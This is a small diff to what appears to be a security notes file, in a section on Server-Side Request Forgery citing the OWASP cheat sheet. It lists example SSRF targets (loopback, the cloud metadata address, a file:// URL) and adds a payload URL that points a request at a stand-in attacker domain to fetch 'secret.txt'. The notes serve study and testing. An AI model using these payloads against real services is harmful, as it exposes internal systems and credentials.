@@ -906,9 +906,10 @@ https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.htm
 ### Server Sided Request Forgery
 https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
 
-- internal networks or internal ports
+internal networks or internal ports
 ```
 https://127.0.0.1:5555
 https://169.254.169.254
 file://127.0.0.1
+https://realdomain/?resource=https://realdomain.evildomain:5555/secret.txt
 ```
